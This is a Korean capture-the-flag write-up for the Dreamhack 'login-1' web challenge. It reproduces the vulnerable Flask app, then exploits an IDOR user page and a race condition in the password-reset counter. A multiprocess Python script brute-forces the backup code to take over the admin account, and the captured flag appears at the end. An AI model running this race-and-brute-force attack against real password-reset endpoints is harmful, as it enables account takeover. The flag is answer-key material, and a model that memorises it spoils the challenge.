https://honey-push-30b.notion.site/login-1-2c9892d5bd1a4ea38971fc289f99e202
# 문제파일 다운로드

![문제파일.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/18feaf89-967e-4a72-898a-63b8a0333aa1/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC.png)

login-1 문제의 접속 정보와 문제파일을 다운로드 받을 수 있다. 다운로드 받으면 [app.py](http://app.py) 파일을 받을 수 있는데 이 파일의 코드는 아래와 같다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
import sqlite3
import hashlib
import os
import time, random

app = Flask(__name__)
app.secret_key = os.urandom(32)

DATABASE = "database.db"

userLevel = {
    0 : 'guest',
    1 : 'admin'
}
MAXRESETCOUNT = 5

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

def makeBackupcode():
    return random.randrange(100)

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ? and pw = ?', (userid, hashlib.sha256(password.encode()).hexdigest() )).fetchone()
        
        if user:
            session['idx'] = user['idx']
            session['userid'] = user['id']
            session['name'] = user['name']
            session['level'] = userLevel[user['level']]
            return redirect(url_for('index'))

        return "<script>alert('Wrong id/pw');history.back(-1);</script>";

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")
        name = request.form.get("name")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            return "<script>alert('Already Exists userid.');history.back(-1);</script>";

        backupCode = makeBackupcode()
        sql = "INSERT INTO user(id, pw, name, level, backupCode) VALUES (?, ?, ?, ?, ?)"
        cur.execute(sql, (userid, hashlib.sha256(password.encode()).hexdigest(), name, 0, backupCode))
        conn.commit()
        return render_template("index.html", msg=f"<b>Register Success.</b><br/>Your BackupCode : {backupCode}")

@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";

@app.route('/user/<int:useridx>')
def users(useridx):
    conn = get_db()
    cur = conn.cursor()
    user = cur.execute('SELECT * FROM user WHERE idx = ?;', [str(useridx)]).fetchone()
    
    if user:
        return render_template('user.html', user=user)

    return "<script>alert('User Not Found.');history.back(-1);</script>";

@app.route('/admin')
def admin():
    if session and (session['level'] == userLevel[1]):
        return FLAG

    return "Only Admin !"

app.run(host='0.0.0.0', port=8000)
```

여기서 주요 함수들은 다음과 같다. 

1. MakeBackupCode
2. Login
3. Register
4. forgot_password()
5. users
6. admin

그리고 userlevel은 0일경우 guest 1일경우 admin이다.

# makeBackupCode

```python
def makeBackupcode():
    return random.randrange(100)
```

백업 코드를 생성해준다. 0~99사이의 값으로 설정해준다.

# login

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ? and pw = ?', (userid, hashlib.sha256(password.encode()).hexdigest() )).fetchone()
        
        if user:
            session['idx'] = user['idx']
            session['userid'] = user['id']
            session['name'] = user['name']
            session['level'] = userLevel[user['level']]
            return redirect(url_for('index'))

        return "<script>alert('Wrong id/pw');history.back(-1);</script>";
```

GET으로 요청할 경우 사용자에게 로그인 페이지를 보여준다.

POST의 경우 사용자로 부터 userid와 password를 받아 db에서 user id와 password가 일치하는 것이 있는지 SQL 쿼리를 실행하고 유저가 존재하면 로그인 상태로 session을 설정해준다.

# register()

```python
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")
        name = request.form.get("name")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            return "<script>alert('Already Exists userid.');history.back(-1);</script>";

        backupCode = makeBackupcode()
        sql = "INSERT INTO user(id, pw, name, level, backupCode) VALUES (?, ?, ?, ?, ?)"
        cur.execute(sql, (userid, hashlib.sha256(password.encode()).hexdigest(), name, 0, backupCode))
        conn.commit()
        return render_template("index.html", msg=f"<b>Register Success.</b><br/>Your BackupCode : {backupCode}")

```

GET으로 요청할 경우 사용자에게 로그인 페이지를 보여준다.

POST의 경우 사용자로 부터 userid와 password를 받아 db에서 user id와 password가 일치하는 것이 있는지 SQL 쿼리를 실행하고 유저가 존재하면 로그인 상태로 session을 설정해준다.

# forgot_password()

```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";
```

비밀번호를 잊었을 때 재설정하는 페이지이다. 비밀번호를 비교할 때는 입력한 비밀번호값의 해쉬값을 이용해서 비교를 하며 backupCode가 같아야지만 비밀번호 재설정을 할 수 있다.

이때 비밀번호 재설정을 위한 backupCode는 0~100으로 전부 대입하여 알아내는 방법을 막기 위하여 한번 비밀번호 재설정을 시도할 때 마다 ResetCount를 초기 값인 0에서 1씩 늘리며 5가 되면 reset 횟수가 초과 되었다는 alert와 함께 더이상 reset을 시킬 수 없다.

이 때 고려해야 하는 점은 time.sleep(1)로 인해서 요청을 보낸 값이 1초 동안 멈춰있다가 진행된다는 것이다.  그리고 이 resetCount값은 makeBackupCode와 비교후 틀렸을 때 1씩 증가하므로 증가하기전에 10개의 값을 한번에 보내준다면 resetCount값이 0일때 10개가 비교가 이루어지게 되고 한번에 10으로 증가하여 그 이후로 resetCount값은 MAXRESETCOUNT값인 5와 동일해지지 않기 때문에 0~100으로 전부 대입할 수 있다. 

# users

```python
@app.route('/user/<int:useridx>')
def users(useridx):
    conn = get_db()
    cur = conn.cursor()
    user = cur.execute('SELECT * FROM user WHERE idx = ?;', [str(useridx)]).fetchone()
    
    if user:
        return render_template('user.html', user=user)

    return "<script>alert('User Not Found.');history.back(-1);</script>";
```

useridx값에 따라서 user의 정보를 보여주는 페이지이다.

# admin

```python
@app.route('/admin')
def admin():
    if session and (session['level'] == userLevel[1]):
        return FLAG

    return "Only Admin !"
```

session이 존재하고 로그인한 user의 레벨이 1 즉 admin이면 FLAG값을 반환해준다. 

# 문제 풀이

처음에 생각했던 방법은 DB를 사용해서 로그인 하는 방식이었기에 SQL Injection을 생각해보았다.

![파이썬 sql injection 보호기법.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/013bc7e5-5397-4d6a-b5bd-d81085a15a65/%ED%8C%8C%EC%9D%B4%EC%8D%AC_sql_injection_%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95.png)

![404Error페이지.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6c09c1bd-f0e7-4260-a93d-7b8e05d905ca/404Error%ED%8E%98%EC%9D%B4%EC%A7%80.png)

하지만 사용자의 입력값을 파라미터로 아래 처럼 execute시에 파라미터로 넣어주는 경우 String으로 치환하여 사용하므로 Injection에 걸리지 않는다.

![로그인창.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/78fc25b4-9258-4bae-af23-4922c38aaa7e/%EB%A1%9C%EA%B7%B8%EC%9D%B8%EC%B0%BD.png)

일단 로그인창에서 register를 이용해서 아이디를 하나 추가해주었다.

![admin.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2c81b62d-247d-4b5b-b535-aa0ceaf7cb7c/admin.png)

admin을 추가해주면 BackupCode를 알려준다.

![Backupcode.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/66c8faa4-359d-436a-acff-7f29002adc69/Backupcode.png)

![로그인.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/856fbe9c-47de-4ea4-a8b0-8249d953e1ff/%EB%A1%9C%EA%B7%B8%EC%9D%B8.png)

그리고 만든 계정으로 로그인을 하면 로그인 성공창이 뜬다.

 

![user17.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/86c298b2-c12a-4c40-960f-599aceb8cc8a/user17.png)

admin 으로 로그인 하고 ID:admin을 누르면 위와 같이 바뀌며 경로는 /user/17로 되어있다. UserLevel이 0이므로 admin 페이지로 접속을 해도 권한이 없어서 접속이 불가능하다.

![Apple.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cd01827d-8ea0-4c0b-bd0b-4e326a3d8892/Apple.png)

이 index 값을 조작하여 /user/1로 바꾸면 다른 유저의 정보를 염탐할 수 있다. Apple의 경우 UserLevel이 1이므로 Apple로 로그인한 후 admin페이지를 호출하면 FLAG를 얻을 수 있다. 

이제 Apple의 ID는 Apple 임을 알 수 있으므로 Apple로 로그인을 시도해야 한다. 그리고 본 문제에서는 execute시에 파라미터로 넣어주므로 SQL Injectin은 되지 않는다. 따라서 이번에는 코드 분석시에 forgot_password에서 1초 동안 쉬는 sleep 구문을 이용해서 한번에 여러 쓰레드를 이용해 1초내에 MAXRESETCOUNT값인 5를 넘겨 버리고 무작위 대입법을 막기 위한 MAXRESETCOUNT 조건을 우회하고 0~100값을 대입해서 원하는 비밀번호로 변경하는 식으로 진행했다.

```python
import requests,random
from multiprocessing import Process

query='http://host3.dreamhack.games:18218/forgot_password'
def answer(low,high):
    for i in range(low,high):
        data={
            'userid':'Apple',
            'newPassword' : 'Apple',
            'backupCode':i
        }
        response=requests.post(query,data)
        print(i)
        if 'Success' in response.text:
            print(i,"success")
            break
    
if __name__=="__main__":
    th1 = Process(target=answer, args=(0,5))
    th2 = Process(target=answer,args=(5,10))

    th1.start()
    th2.start()

    for i in range(0,100):
        data={
            'userid':'Apple',
            'newpassword' : 'Apple',
            'backupCode':i
        }
        response=requests.post(query,data)
        print(i)
        if 'Password Change Success' in response.text:
            print(i,"success")
            break
```

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c5579a4b-ca02-45d4-94b0-3bb258547ae1/%EC%84%B1%EA%B3%B5.png)

Apple의 비밀번호를 Apple로 변경하는데 성공했다. 이제 Apple/Apple로 로그인하자

![Apple 로그인.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5078180d-484b-44ce-9652-8c8bb255662b/Apple_%EB%A1%9C%EA%B7%B8%EC%9D%B8.png)

이제 URL에 경로에 /admin을 추가하여 admin페이지로 접속하면 FLAG값DH{4b308b526834909157a73567075c9ab7} 를 얻을 수 있다.

![FLAG.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6c5bb192-c915-49f9-a407-91cb57651990/FLAG.png)

